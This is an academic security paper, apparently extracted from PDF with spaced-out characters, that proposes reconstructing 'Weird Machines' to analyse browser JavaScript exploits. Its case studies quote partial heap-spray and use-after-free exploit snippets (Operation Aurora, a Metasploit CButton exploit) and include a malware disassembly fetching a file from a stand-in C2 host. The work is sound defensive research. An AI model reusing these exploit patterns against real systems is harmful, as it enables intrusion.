@@ -1,0 +1,943 @@
+Casting exploit analysis as a Weird Machine
+reconstruction problem
+Robert Abela and Mark Vella
+Department of Computer Science
+University of Malta
+Msida, Malta
+Email: {Robert.Abela.15, Mark.Vella}@um.edu.mt
+Abstract—Exploits constitute malware in the form of application inputs. They take advantage of security vulnerabilities inside
+programs in order to yield execution control to attackers. The
+root cause of successful exploitation lies in emergent functionality
+introduced when programs are compiled and loaded in memory
+for execution, called ‘Weird Machines’ (WMs). Essentially WMs
+are unexpected virtual machines that execute attackers’ bytecode,
+complicating malware analysis whenever the bytecode set is
+unknown. We take the direction that WM bytecode is best
+understood at the level of the process memory layout attained by
+exploit execution. Each step building towards this memory layout
+comprises an exploit primitive, an exploit’s basic building block.
+This work presents a WM reconstruction algorithm that works by
+identifying pre-defined exploit primitive-related behaviour during
+the dynamic analysis of target binaries, associating it with the
+responsible exploit segment - the WM bytecode. In this manner
+any analyst familiar with exploit programming will immediately
+recognise the reconstructed WM bytecode’s semantics. This work
+is a first attempt at studying the feasibility of this method and
+focuses on web browsers when targeted by JavaScript exploits.
+Keywords—malware analysis; script exploits; weird machines;
+dynamic binary analysis
+I. INTRODUCTION
+Exploits are a peculiar kind of malware, where rather
+than constituting a properly packaged executable binary or
+script/macro, they take the form of application inputs. Exploits
+take advantage of security flaws along with intended and
+unintended functionality inside applications in order to subvert
+their control flow. The shifting of application execution control
+to the attacker renders exploits and ideal entry point for
+intrusions. A typical scenario is that of drive-by-downloads [1]
+where application inputs in the form of malicious HTML that
+embed malicious client-side scripts, target memory corruption errors, e.g. buffer overflows or dangling pointers, inside
+web-browser/script-engine/browser-plugin code. The aim is
+to subvert the browser’s execution and make it download
+‘conventional malware’, such as a backdoor or a commandand-control bot in order to complete a stealthy intrusion.
+While a multitude of vulnerability types abound, memory
+errors are quite distinguished due to their ability to yield the
+target’s computational power to the attacker all along with its
+security privileges, and are the focus of this work. Moreover
+we focus specifically on JavaScript exploits [2] targeting web
+browsers for the time being, although the longer term goal is
+to encompass all exploit forms.
+The mainstream view on exploits is that: security vulnerabilities are their sole cause for success; exploits are as
+ad-hoc as much as the process of vulnerability introduction
+is; and that vulnerability elimination is the only way to
+secure application code-bases. Yet, this view misses the crucial
+emergent behaviour introduced when programs are compiled
+and loaded in memory for execution, and is what makes
+exploit programming possible. The term Weird Machine (WM)
+has been coined to refer to the instance when this emergent
+functionality is leveraged by attackers, and which presents a
+more complete/less ad-hoc view of the actual situation [3].
+Think of this WM as some virtual machine that takes programs
+written in the bytecode that it understands for execution as
+input, and outputs the programs’ results (section II). The main
+point here is that the WM bytecode is not some documented
+VM instruction set, rather it is unknown.
+In the field of malware analysis, WMs complicate the process of inferring malicious behaviour from JavaScript exploits
+since the script statements have to be analysed in terms of
+bytecode intended for the, yet unknown, WM as targeted by
+the exploit writer. As an example let’s compare Listings 1
+and 2. The former is a snippet taken from the disassembly
+of a conventional binary malware. In this case the malware’s
+behaviour can be directly inferred from the semantics of the
+physical machine instructions and system API calls: lines 1-
+8 set up the arguments for the InternetOpenUrlA call
+on line 9, and depending on it’s return value execution is
+forked on lines 10-12 to possibly download cc.htm from
+http://www.attackercnc.com on line 14.
+Listing 1
+BINARY MALWARE DISSASSEMBLY
+1 . . . s n i p . . .
+2 p u s h 0 x 4 0 7 0 f 4 ; ” M o zill a / 5 . 0 ( Windows NT 6 . 3 ; . . . ”
+3 c a l l dword [ d s : im p I nt e r n etO p e nA ]
+4 mov dword [ s s : ebp+ va r C ] , ea x
+5 . . . s n i p . . .
+6 p u s h 0 x4070c4 ; ” h t t p : / / www. a t t a c k e r c n c . com / cc . htm ”
+7 mov eax , dword [ s s : ebp+ va r C ]
+8 p u s h ea x
+9 c a l l dword [ d s : im p I nt e r n et O p e n U rl A ]
+10 mov dword [ s s : ebp+ v a r 1 0 ] , ea x
+11 cmp dword [ s s : ebp+ v a r 1 0 ] , 0 x0
+12 j n e 0 x40109d
+13 . . . s n i p . . .
+14 c a l l dword [ d s : i m p I n t e r n e t R e a d F i l e ]
+15 . . . s n i p . . .
+The latter HTML-embedded JavaScript sample is more
+arXiv:2109.13100v1 [cs.CR] 27 Sep 2021
+intricate. At face value lines 6-7 create a hidden HTML layer,
+lines 8-9 create a very long string which is then used as a
+property value to the multitude of HTML buttons added to
+this invisible layer on lines 10-15. In web design terms this
+snippet is pretty much useless. Yet this is none other than a
+WM bytecode sequence intended to setup attacker-controlled
+physical machine instructions inside the browser’s memory
+and eventually executed by subsequent statements that exploit
+the presence of a memory error inside the browser’s codebase. Thus, reconstructing the WM bytecode is the essential
+first step for exploit analysis.
+Listing 2
+JAVASCRIPT EXPLOIT MALWARE
+1 <html>
+2 <head></head>
+3 <body>
+4 <di v i d =” bl a h ”></di v>
+5 <s c r i p t l a n g u a g e = ’ j a v a s c r i p t ’>
+6 v a r d i v c o n t a i n e r = document . g et El e m e nt b y I d ( ” bl a h ” ) ;
+7 d i v c o n t a i n e r . s t y l e . c s s T e x t = ” d i s p l a y : none ” ;
+8 v a r d a t a = u n e s c a p e ( ”% 9 0 9 0%... s n i p . . . %CCCC . . . ” ) ;
+9 w hil e ( d a t a . l e n g t h < 0 x80000 ) d a t a += d a t a ;
+10 f o r ( v a r i = 0; i <0x250 ; i ++ )
+11 {
+12 v a r o bj = document . c r e a t e E l e m e n t ( ” b u t t o n ” ) ;
+13 o bj . t i t l e = d a t a . s u b s t r i n g ( 0 , 0 x40000 −0 x58 ) ;
+14 d i v c o n t a i n e r . a p p e n dC hil d ( o bj ) ;
+15 } . . . s n i p . . .
+16 </ s c r i p t >
+17 </body>
+18 </ html>
+In-line with the above example, we postulate that from
+an exploit analysis point-of-view, the WM bytecode is best
+understood at the level of the process memory layout that
+exploits are programmed to attain, eventually enabling them to
+program the WM. Each step taken to build towards this layout
+comprises an exploit primitive: the basic building blocks of
+exploit programming. This way any analyst familiar with
+exploit programming will immediately recognize the bytecode’s semantics. This work is a first attempt at studying the
+feasibility of this approach, and as far as we know we are the
+first to cast exploit analysis as a WM reconstruction problem.
+The end result is a WM reconstruction algorithm that works
+by identifying pre-defined exploit primitive-related runtime
+behaviour during dynamic binary analysis and subsequently
+associating it with the responsible exploit snippet as fed as
+input to the target browser (section III). The implicated script
+statements constitute the WM’s bytecode syntax, the machine’s
+opcodes so to speak, while the exploit primitives assigned
+to them through appropriate labels provide their semantics.
+Experimentation with 4 popular exploit primitives as used by
+3 script exploit case studies (section IV) demonstrate that detecting WM bytecode syntax and their semantics using exploit
+primitives is possible by defining the primitives as program
+memory-level state transitions. In turn the case studies show
+that having a WM reconstruction algorithm at the heart of
+an exploit analysis tool helps the analyst to move beyond the
+script’s superficial semantics and into the program memory
+level, which is what matters when understanding exploits.
+Finally, experimentation outcome provides the basis for a
+research direction for completing the work on a finalized
+Application
+functionality &
+bugs
+Application input
+e.g.HTML+JavaScript
+Application output
+e.g. Web page
+Weird Machine bytecode P
+WM
+e.g. Drive­by­download
+P
+WM output 
+e.g. Backdoor installation
+Emergent functionality ­
+the Weird Machine
+Fig. 1: Weird Machines: Emergent program functionality that
+produce unexpected virtual machines.
+exploit analysis tool usable in a wider array of exploit forms
+(sections V and VI).
+II. BACKGROUND AND RELATED WORK
+The Weird Machines (WM) targeted by attackers are none
+other than emergent program functionality as generated by
+compilers, linkers and program loaders in the process of executable image creation and loading. The resulting executable
+inside program memory comprises machine code and data that
+has been for long treated as obscure/uninteresting material
+by computer scientists, even though this is where attackers
+thrive [3]. Access to this emergent functionality in fact requires substantial knowledge of what goes on at the program
+memory level, along with the presence of memory errors
+for activating its full malicious potential. Fig. 1 depicts the
+scenario of programming a WM emerging from web browsers.
+The intended functionality here constitutes the parsing of
+HTML documents into some intermediate representation, e.g.
+Document Object Model (DOM) tree, which is then fed to
+a rendering algorithm for on-screen visualization. Embedded
+JavaScript snippets, or any supported scripting language for
+that matter, are instead passed on to a script engine for
+interpretation/just-in-time compilation. Ultimately, a number
+of statements constitute calling back into the browser (and
+it’s extensions) to dynamically update the rendered page. The
+code-base concerned is typically natively coded in C, or any
+of its derivatives, and which is a process highly prone to
+the introduction of memory errors, e.g. see [4], resulting in
+particularly dangerous WM bytecode that can fully subvert
+the executable’s control flow.
+This is what happens in the case of drive-by-downloads,
+where using scripts similar to the one shown in Listing 2
+as input WM programs P WM made up of WM bytecode,
+these are processed by the emerging WM to compute P WM’s
+output, e.g. backdoor installation. So far the WM concept
+has been used to explain the computational hardness of the
+input sanitization problem as a means to eliminate security-
+related errors inside parser code-bases whenever processing
+untrusted application inputs. Its proponents suggest a formal
+language/parser-generation approach to secure coding [5].
+Subsequently, investigation of the WM concept has been taken
+beyond software programs and into the hardware domain [6].
+Scripts exploits have been of particular interest in recent
+years since they improve upon earlier file/network packet
+exploit techniques in order to break modern exploit deferences
+[7]. In turn these exploits have become much more daunting to
+understand. Listing 3 depicts the layout of a typical file exploit,
+that usually contains some string intended to both corrupt a
+function pointer in memory as well as the compiled malicious code to be executed. In contrast, script exploits involve
+multiple steps that create a specific program memory layout
+before successful exploitation can take place, typically aiming
+to divert execution to some earlier created string whose content
+doubles as valid machine code. Nowadays, exploit sophistication has increased to the level where existing executable
+content inside the browser’s memory can be searched for and
+re-composed in a way to create new computations on-the-fly.
+This way a myriad of exploit mitigations can be defeated.
+As a result, manually inferring the exploit sequence proves
+to be a painstaking process that requires intimate knowledge
+of complex script engines, document parsers, as well the
+interaction between the two, e.g. see [8]. Rather, an exploit
+analysis tool that labels simple/compound scripts statements as
+WM bytecode, and whose semantics are grounded in exploit
+primitive behaviour, would only require knowledge of exploit
+programming in general.
+Listing 3
+FILE EXPLOIT FRAGMENT
+| Hea de r f i e l d 1 | Hea de r f i e l d 2 | 90 90 90 . . .
+( v e r y l o n g s t r i n g ) . . . CC CC CC CC CC . . .
+Exploit analysis is a specific instance of malware analysis
+in general, which is an incident response task that studies
+malware samples acquired during digital investigation. Its aim
+is to infer malware objectives from compiled code to produce
+actionable information in the form of intrusion detection rulesets and dis-infection routines. Exploit analysis specifically is
+concerned with improving upon existing exploit mitigations
+as well as to inform more secure code-bases in general.
+Research-wise, exploration has been mainly concerned with
+the complete exposure of malicious behaviour inside malware sandboxes, and therefore providing effective automation.
+The main challenge here is posed by hidden/trigger-based
+behaviour that eludes sandboxes [9]. This is typically handled
+as a state-space exploration problem solvable using symbolic
+execution of binaries [10]. Taint analysis is a complementary
+technique used to identify the data objects of interest so
+as to solely apply expensive symbolic execution upon those
+traces that process these objects, while concretely executing
+the remaining ones [11]. Once the sought after behaviour is
+finally exposed it is paramount that this is recognized as such
+[12].
+The work closest to ours, JScalpel, builds upon this
+approach with the purpose of identifying just the execution
+of the injected code, distinguishing it from browser/engine
+activity during dynamic binary analysis [13]. This method
+however disregards explaining the overall exploit strategy
+and highlighting, for example, how existing mitigations are
+being bypassed or which statements actively program the
+emerging WM. Yet, it does acknowledge the value of aiding
+the analyst in fully understanding exploits by weeding out
+statements that do not contribute to exploitation. By focusing
+on WM reconstruction, we propose that exploit scripts can be
+labelled in a way to support the analyst throughout the entire
+exploitation sequence.
+III. WEIRD MACHINE RECONSTRUCTION
+The WM reconstruction algorithm revolves around the notion of an exploit primitive which was first coined in [14].
+Informally, and within the specific context of script exploits,
+it refers to a simple or compound script statement that provides
+access to a program memory-level (native) operation that
+would otherwise not be directly available at script-level. Here,
+we are interested in characterizing WM bytecode in terms of
+exploit primitives, with the WM bytecode space encompassing
+all possible exploit primitives, while the primitives’ behaviour
+provide bytecode with their semantics. Formally:
+Definition 1. An exploit primitive’s behaviour, as identified
+through its primitive label l is defined as: the program memory
+state transition function δl
+: P(W) × Σ → P(W0
+); where
+W = {w0, w1, w2, ..., wn} and W0 = {w
+0
+0
+, w0
+1
+, w0
+2
+, ..., w0
+n}
+are abstractions over the full program memory state defined as a set of derived values wi and w
+0
+i
+; while Σ =
+{p0, p1, p2, ..., pm} is the set of candidate Weird Machine
+bytecode, where each candidate primitive label pi could be
+associated with a simple or compound statement inside script
+exploit E.
+Definition 2. A Weird Machine with respect to the execution
+of web browser B on input exploit E, denoted by WME→B,
+is defined as: the function fWME→B : Σ → L
+∗
+; where
+L = {l0, l1, l2, ..., ln} is the set of labels, one for each defined
+exploit primitive behaviour in ∆ = {δl0
+, δl1
+, δl2
+, ..., δln
+}. Then
+for some (p, l∗
+) ∈ fWME→B implies that p constitutes valid
+bytecode for WME→B, whose semantics is defined by the
+sequence of δl’s corresponding to the string of labels l
+∗
+.
+Note: fWME→B is not injective, meaning that the same exploit
+primitive label string l
+∗
+could be associated with different
+bytecodes. This is a stark reminder that we are not dealing
+with conventional purposely-designed virtual machines, but
+rather with unintended ‘weird’ ones.
+Therefore WM reconstruction is about identifying the WM
+bytecode’s syntax and semantics so to speak, and comprises:
+i) Choosing the exploit primitives l of interest. ii) Expressing their behaviour in the form of program memory state
+transitions δl
+. iii) Script preparation in terms of identifying
+the script statements that comprise candidate WM bytecode
+p and marking them accordingly. iv) Detecting transitions
+conforming to some δl during the dynamic binary analysis of the browser/engine as executed upon the exploit
+script under analysis. v) Associating any detected δl with
+its corresponding p using label l, which is now confirmed
+as being an exploit primitive/WM bytecode. p is added
+to the WM bytecode set, while δl provides its semantics.
+This procedure is formalized by algorithm 1 - WMRecon.
+It executes until exploit termination or time-out (line 1).
+resumeExecutionUntilNextP() (line 2) executes the
+exploit up until before the next p. During a fresh analysis it
+is line 11 that executes next, calling deriveState() in
+order to compute the abstract program state Wp associated
+with the prior execution of p. In case of simple statements the
+second state W0
+p
+is computed as the resulting state when p gets
+executed by executeComplete() (lines 16-17). Finally,
+lines 18-20 use transitionsIdentify() in order to
+detect a possible sequence of state transitions conforming to
+some δln
+’s in ∆, updating fWME→B accordingly. In case
+a p is associated with a compound statement, the derived
+Wp is pushed onto a stack (lines 12-15), which is then only
+used when all of its corresponding statements have completed
+execution (lines 3-10). In this manner, each individual script
+statement can be associated with multiple candidate WM
+bytecodes, i.e. on its own as well as part of statement blocks.
+Algorithm 1: WMRecon - Weird Machine reconstruction
+Input: Web Browser B, Exploit sample E, Σ as defined over E,
+L = {l0, l1, l2, ..., ln} the set of labels corresponding to
+∆ = {δl1
+, δl2
+, ..., δln
+}
+Output: The reconstructed Weird Machine
+WME→B
+def = fWME→B
+: Σ → L∗
+1 while !(terminates(E) or timesOut(E)) do
+2 p ← ResumeExecutionUntilBeforeNextP(E);
+3 if closesCompound(p) then
+4 W0
+p ← deriveState(B);
+5 (p, Wp) ← popStack(Γ);
+6 if (l
+∗ ← transitionsIdentify(∆, Wp, W0
+p)) 6= 
+then
+7 fWME→B
+(p) = l
+∗ ;
+8 next;
+9 end
+10 end
+11 Wp ← deriveState(B);
+12 if isCompound(p) then
+13 pushStack(Γ, (p, Wp));
+14 next;
+15 end
+16 executeComplete(p);
+17 W0
+p ← deriveState(B);
+18 if (l
+∗ ← transitionsIdentify(∆, Wp, W0
+p)) 6=  then
+19 fWME→B
+(p) = l
+∗ ;
+20 end
+21 end
+22 return fWME→B
+;
+Once incorporated as part of an exploit analysis tool the
+envisaged process, depicted in Fig. 2, proceeds as follows:
+i) The de-obfuscated script (e.g. using JSBeautifier1
+) is
+prepared with markers representing the candidate primitives
+1http://jsbeautifier.org/
+Fig. 2: An example exploit analysis process when using a tool
+that implements WMRecon
+p using the setMarker(‘Candidate primitive’).
+resetMarker() is used to end a marker associated with
+compound statements. This step can be carried out manually
+or can be tool assisted. ii) p markers are then associated with
+WM bytecode labels, e.g. //Loop::AllocPrimitive,
+whenever found to produce exploit primitive behaviour. In this
+case, the candidate primitive marker Loop has been associated
+with the AllocPrimitive exploit primitive, referring to
+its memory allocation behaviour for example. The subsequent
+Info: line further qualifies the observed runtime behaviour.
+The labelled script exploit presents the partially reconstructed
+WM, with the compound for-loop statement block identified as
+valid WM bytecode, whose semantics is to allocate 5 chunks
+of 1MB memory buffers. Completing the WM could require
+further iterations with adjusted markers and further analysis
+iterations.
+IV. EVALUATION
+The idea of doing exploit analysis by reconstructing the
+WMs targeted by the exploit writers is now evaluated for
+its feasibility. Specifically this is carried out in terms of
+expressing exploit primitive behaviour as program memory
+state transition functions (section IV-A) and their effectiveness
+when utilized by a WRecon-based tool (section IV-B) in
+correctly labelling exploit samples (section IV-C), and thus
+accurately reconstructing the WMs concerned.
+A. Exploit primitives
+4 exploit primitives are chosen based on the notion that they
+should provide the script level with access to native operations.
+Each primitive is first informally described, then a C-code
+(native-level) snippet form of description is used as an aid in
+building towards a formal description. Finally the formal δl
+definition is provided, that takes the form of a constraint on
+the prior (W) and post (W0
+) transition states that needs to be
+satisfied by the candidate primitives in Σ to be associated with
+l.
+1) Memory allocation primitive: Allocates a chunk of
+memory on the process heap. At the C code-level, this primitive is described as a function call to the standard C library
+malloc() function. Of course this is just a tool for intuition,
+as in most cases it is not expected that at the script level it will
+be possible to utilize the allocated portion of memory in any
+way the programmer desires, as when programming natively.
+Furthermore, memory allocation could be carried out in various ways even at the native level e.g. directly through a system
+call or else by calling custom memory managers. Consequently
+its behaviour can be expressed over the abstract program
+state W = {w0
+def = ‘Size of allocated heap memory’}, as:
+δmemalloc({w0}, p) = {w
+0
+0}, ∀p such that w
+0
+0 > w0.
+2) Memory freeing primitive: Frees a previously allocated
+chunk of memory on the process heap, as expressed at the
+C code-level through a call to free(). It’s behaviour is
+expressed over the same abstract program state W as the
+previous primitive. In fact its behaviour is exactly the opposite
+and is defined as: δmemf ree({w0}, p) = {w
+0
+0}, ∀p such that
+w
+0
+0 < w0.
+3) Execute crafted code primitive: Sets the program
+counter to an address containing attacker-controlled executable
+content and executes it. As such, the C code-level behaviour
+this time requires a description that is a bit more involved,
+making use of a function pointer initialized to an address
+containing machine instructions that dynamically extends the
+original code-base. The description is as follows:
+v oi d e x e c C r a f t e d {
+v oi d (* f p t r ) ( ) ;
+v oi d t a r g e t a d d r = <p r e d i c t e d / d i s c l o s e d >;
+/ / C o nt a i n s a t t a c k e r − c o n t r o l l e d c o de
+f p t r = t a r g e t a d d r ;
+f p t r ( ) ;
+}
+It is understood that target_addr already contains
+attacker-controlled code from the execution of prior primitives. The same argument applies in case target_addr
+requires disclosing when it cannot be predicted a-priori. Finally, this primitive requires the presence of a memory error
+before it can be made available at the script level, e.g. a
+buffer overflow or a dangling pointer, and thus relates to
+the WM bytecode of the most dangerous kind. The corresponding behaviour is expressed over the abstract program
+state W = {w0
+def = %pc, w1
+def = {‘Expected codebase’}}
+as: δexecCraf ted({w0, w1}, p) = {w
+0
+0
+, w0
+1 = w1}, ∀p such
+that w
+0
+0 6∈ w
+0
+1
+. %pc refers to the program counter register,
+while ‘expected codebase’ refers to the known memory regions
+containing the browser’s code e.g. .text executable image
+sections or heap memory reserved for just-in-time (JIT) script
+engines.
+4) Call stack replacement primitive: Sets the stack
+pointer to an attacker-controlled memory location containing
+a fabricated call stack, corrupting the flow execution on
+return from the innermost function call thereafter. As such,
+the C code-level behaviour is very similar to the previous
+primitive but for two differences. Firstly, it is the presence
+of a fabricated call stack which is being assumed, rather
+than attacker-controlled executable content. Secondly, it is the
+stack pointer register this time being manipulated, hence the
+inline assembly performing a stack pivot. This primitive also
+presupposes a memory error, with its description being:
+v oi d c a l l S t a c k R e p l a c e {
+v oi d t a r g e t a d d r = <p r e d i c t e d / d i s c l o s e d >;
+/ / C o nt ai n s t h e f a b r i c a t e d c a l l s t a c k
+asm v o l a t i l e ( ” mov %r s p , %0” : : ” r ” ( t a r g e t a d d r ) ) ;
+}
+The corresponding behaviour is expressed over the abstract program state W = {w0
+def = %sp, w1
+def =
+{‘Expected call stack’}} as: δcallStackReplace({w0, w1}, p) =
+{w
+0
+0
+, w0
+1 = w1}, ∀p such that w
+0
+0 6∈ w
+0
+1
+. %sp refers to the
+stack pointer register, while ‘expected call stack’ refers to the
+memory regions containing known call stacks for application
+threads.
+B. Prototype implementation
+A prototype of a WMRecon-based tool was developed
+for the Windows OS/Internet Explorer environment, which
+is a popular target for drive-by-downloads. DynamoRIO2
+, a
+dynamic binary analysis framework, was used for tracing the
+web browser’s instructions during state transition monitoring,
+as well as to introspect CPU register values and memory
+content during program state derivation (carried out per basic
+instruction block of the script engine thread). Its umbra
+extension also offers a convenient way to walk Window’s
+process VAD trees (umbra_iterate_app_memory()),
+while at the same time filtering out non-application (i.e.
+analysis-related) VAD nodes. As for heap memory manager
+information, specifically concerning freed/available memory
+regions, these are obtained through KD3
+’s !vm extension
+command.
+Implementation of the setMarker() and
+resetMaker() marker functions (as per Fig. 2)
+are provided inside a marker.js script file and
+which requires inclusion within exploit files during the
+script preparation phase. Their implementation makes
+use of the javascript:alert() function which
+in the case of Internet Explorer results in a call to
+MessageBoxIndirectW(). During program instruction
+tracing, any call to this function with arguments matching
+an expected marker is skipped, with the relevant prior (W)
+and post (W0
+) transition states being computed accordingly.
+The known code and call stack regions required by exploit
+primitives 3 and 4 are computed when execution reaches the
+browser’s WinMain() entry point. Overall, the accuracy of
+program state derivation implemented by the current prototype
+is known to possibly be impacted by multi-threading, as well
+as lack of knowledge of custom memory managers and their
+garbage collectors (typical of script engines).
+2http://www.dynamorio.org/
+3https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger
+C. Case studies
+We now present 3 exploit case studies, each including
+a number of the previously defined exploit primitives and
+ordered according to sophistication. In each case, the preanalysis markers and post-analysis labels are shown in a
+superimposed manner in the corresponding script listings.
+Technical analysis of the 3 exploits are publicly available and
+thus the accuracy of the labelling could be verified against
+them. For each case study, the latest vulnerable OS/browser
+version configurations were used.
+1) Standard heap spray: The first case study is taken
+from a heap spraying tutorial [2], a technique commonly
+used to inject multiple instances of malicious compiled code
+inside the target vulnerable application. The environment
+is Win XP SP3/IE 6.00.2800.1106. Listing 4 shows snippets from the exploit sample. In this study a number of
+memalloc and memfree primitives were expected and
+which were duly labelled on lines 9-11, 23-26, and 32-35.
+Specifically, the while loop on line 12 is identified as a
+sequence of predominantly memory allocations with some
+interleaved frees, with memory[i]=block+shellcode;
+and memory[i]=’’; clearly representing memory allocation and freeing WM bytecodes respectively.
+Listing 4
+STANDARD HEAP SPRAY
+1 <s c r i p t s r c =” ma r ke r . j s ”></ s c r i p t >
+2 <s c r i p t >
+3 v a r s h e l l c o d e = u n e s c a p e ( ’% u\4141%u \4 1 4 1 ’ );
+4 v a r b i g b l o c k = u n e s c a p e ( ’% u\9090%u \9 0 9 0 ’ );
+5 v a r h e a d e r s i z e = 2 0;
+6 v a r s l a c k = h e a d e r s i z e + s h e l l c o d e . l e n g t h ;
+7
+8 s etM a r k e r ( ’ BigBlock ’ ) ;
+9 / / Bi gBl oc k : : . . . SNIP . . . memalloc +memalloc +memalloc+\\
+10 memfree . . . SNIP . . .
+11 / / [ I n f o : . . . SNIP . . . 3 1 KB+63KB+63KB+63KB . . . SNIP . . . ]
+12 w hil e ( b i g b l o c k . l e n g t h < s l a c k )
+13 b i g b l o c k += b i g b l o c k ;
+14 v a r f i l l b l o c k = b i g b l o c k . s u b s t r i n g ( 0 , s l a c k ) ;
+15 v a r bl o c k = b i g b l o c k . s u b s t r i n g \\
+16 ( 0 , b i g b l o c k . l e n g t h − s l a c k ) ;
+17 w hil e ( bl o c k . l e n g t h + s l a c k < 0 x40000 )
+18 bl o c k = bl o c k + bl o c k + f i l l b l o c k ;
+19
+20 v a r memory = new A r r a y ( ) ;
+21 f o r ( i = 0 ; i < 5 0 0; i ++ ) {
+22 s etM a r k e r ( ’ S h ell c o d e ’+ i ) ;
+23 / / S h e l l c o d e 0 : : memalloc
+24 / / [ I n f o : 5 1 1KB]
+25 / / S h e l l c o d e 1 : : memalloc
+26 / / [ I n f o : 5 1 1KB] . . . SNIP . . .
+27 memory [ i ] = bl o c k + s h e l l c o d e ;
+28 }
+29
+30 f o r ( i = 0 ; i < 5 0 0; i ++ ) {
+31 s etM a r k e r ( ’ F ree ’+ i ) ;
+32 / / F r e e 0 : : memalloc
+33 / / [ I n f o : 5 1 1KB]
+34 / / F r e e 1 : : memfree
+35 / / [ I n f o : 5 1 1KB] . . . SNIP . . .
+36 memory [ i ] = ’ ’ ;
+37 }
+38 r e s e tM a r k e r ( ) ;
+39 </ s c r i p t >
+2) Operation Aurora exploit: The second case study is
+taken from a technical blog that analyses the exploit that was
+used in the popular Operation Aurora cyberattack [15]. The
+experimentation setup is identical to the one used for the
+previous exploit. In this case a heap spay is followed by a
+use-after-free (UAF) exploit (CVE 2010-0249) and is representative of typical scenarios where virtual function pointers
+get corrupted as a consequence of non-coordination between
+multiple pointers being used to point to the same object in
+memory. When one of the pointers is used to free the memory
+object with missing/incorrect reference counting, the other
+pointers are left referencing a memory region that can get
+reused at any time, and thus have its virtual function table
+pointer ‘overwritten’ and subsequent behaviour left undefined.
+Listing 5 shows snippets from the exploit sample. Lines 18-
+19 identify the entire function FOverwrite() as valid WM
+bytecode that executes crafted code. In particular the information label //[Info:0x0c0d0c0d on line 19 gives away
+what line 26 is about. Not shown in the snippet is a sequence
+of memory allocation and freeing primitives inside the function
+HeapSpray() that crafts the code in a similar fashion to the
+previous case study. Yet, on lines 12-13 the FRemove marker
+remains unlabelled even though a memfree label is expected.
+What is happening here is that this memory region is being
+freed to a custom allocator but not to the underlying system
+heap memory manager, impacting on a known limitation of
+the prototype.
+Listing 5
+OPERATION AURORA EXPLOIT
+1 <s c r i p t s r c =” ma r ke r . j s ”></ s c r i p t >
+2 <s c r i p t >
+3 . . . SNIP . . .
+4
+5 f u n c t i o n HeapSp ray ( ) {
+6 . . . SNIP . . . .
+7 }
+8
+9 f u n c t i o n FRemove ( o nL oa dE ve nt ) {
+10 HeapSp ray ( ) ;
+11
+12 s etM a r k e r ( ’ FRemove ’ ) ;
+13 / / FRemove : :
+14 Eleme nt 1 = document . c r e a t e E v e n t O b j e c t ( o nL oa dE ve nt ) ;
+15 document . g et El em e ntB y I d ( ” SpanID ” ) . innerHTML = ” ” ;
+16
+17 s etM a r k e r ( ’ FO v e rw rit e ’ ) ;
+18 / / F O v e r w rit e : : e x e c C r a f t e d + . . . SNIP . . .
+19 / / [ I n f o : 0 x 0c 0 d 0c 0 d + . . . SNIP . . . ]
+20 window . s e t I n t e r v a l ( FO v e rw rit e , 5 0 ) ;
+21 r e s e tM a r k e r ( ) ;
+22
+23 }
+24
+25 f u n c t i o n F O v e r w rit e ( ) {
+26 b u f f e r = ”\ u0c0d\u0c0d . . . SNIP . . . ” ;
+27 f o r ( i = 0 ; i < A r ra y 1 . l e n g t h ; i ++ )
+28 A r ra y 1 [ i ] . d a t a = b u f f e r ;
+29
+30 </ s c r i p t >
+31 . . . SNIP . . .
+32 <s p a n i d =” SpanID”>
+33 <img s r c = ”/ a bc d . g i f ” o nl o a d =”FRemove ( e v e n t ) ” />
+34 </ span>
+35 . . . SNIP . . .
+3) CButton use-after-free (UAF): The third case study
+obtained from the Metasploit4 penetration testing framework
+was chosen for its use of the Return-Oriented Programming
+4The Metasploit Framework - ie cbutton uaf exploit
+(ROP) technique. ROP is about recomposing existing executable content inside the target browser and thus is able
+to bypass Data Execution Prevention (DEP) mitigation that
+renders stack/heap segments non-executable, and any exploits
+expecting them to be so are thus rendered inert. In the
+presence of a library loaded at a deterministic memory address base (i.e. non-Address Space Layout Randomization
+(ASLR) enabled), a UAF exploit (CVE 2012-4792) is used
+to direct execution to an instruction that pivots the stack to
+an attacker-controlled location, enabling the execution of an
+instruction sequence that effectively switches off DEP. The
+exploit then resumes in a similar fashion to the previous
+case study. The sample is shown in Listing 6 and is executed on a Win XP SP3/IE 8.0.6001.18702 environment. The
+entire function mstime_malloc() as called from line 54
+constitutes WM bytecode whose semantics corresponds to
+a sequence of callStackReplace and execCrafted
+primitives. The addresses present in the labels (0x046ae04c
+and 0x046ae1ad) are respectively the contents of the stack
+pointer and program counter registers. These are addresses
+of memory locations allocated during script execution, and
+which trigger the detection of exploit primitives 4 and 3.
+Further iterations would be required to zoom into a finer level
+of analysis granularity in order to identify those statements
+specifically causing each type of exploit primitive behaviour.
+In the meantime the create_btns, free_btns and gc
+markers on lines 19, 27 and 32 respectively remain unlabelled
+due to the same custom allocator issue already encountered
+in the previous case study. On the other hand the prepare
+marker on line 36 is properly labelled. The allocation sizes
+concerned indicate that, in the case of Internet Explorer, larger
+allocations are likely to get detected since they affect the
+underlying system heap manager, or else avoid involving the
+custom allocator altogether.
+Listing 6
+CBU T T O N UAF EXPLOIT
+1 <! d o ct y p e html>
+2 <HTML XMLNS: t =” u r n : schemas − m i c r o s o f t −com : tim e”>
+3 <head>
+4 <meta>
+5 <?IMPORT name s pace =” t ” i m p l e m e n t a t i o n =”# d e f a u l t # tim e 2”>
+6 </meta>
+7
+8 <s c r i p t >
+9 f u n c t i o n m stim e m all o c ( oArg ) {
+10 . . . SNIP . . .
+11 }
+12
+13
+14 f u n c t i o n h ell oW o rl d ( ) {
+15 e f o rm = document . g et El em e ntB y I d ( ” fo rmelm ” ) ;
+16 e di v = document . g et El em e ntB y I d ( ” di v elm ” ) ;
+17
+18 s etM a r k e r ( ’ c r e a t e b t n s ’ ) ;
+19 / / c r e a t e b t n s : :
+20 f o r ( i = 0; i < 2 0; i ++ ) {
+21 document . c r e a t e E l e m e n t ( ’ b utt o n ’ ) ;
+22 }
+23 e di v . a p p e n dC hil d ( document . c r e a t e E l e m e n t ( ’ b utt o n ’ ) ) ;
+24 e di v . f i r s t C h i l d . a p pl y El em e nt ( e f o rm ) ;
+25
+26 s etM a r k e r ( ’ f r e e b t n s ’ ) ;
+27 / / f r e e b t n s : :
+28 e di v . innerHTML = ” ” ;
+29 e di v . a p p e n dC hil d ( document . c r e a t e E l e m e n t ( ’ body ’ ) ) ;
+30
+31 s etM a r k e r ( ’ gc ’ ) ;
+32 / / gc : :
+33 C o l l e c t G a r b a g e ( ) ;
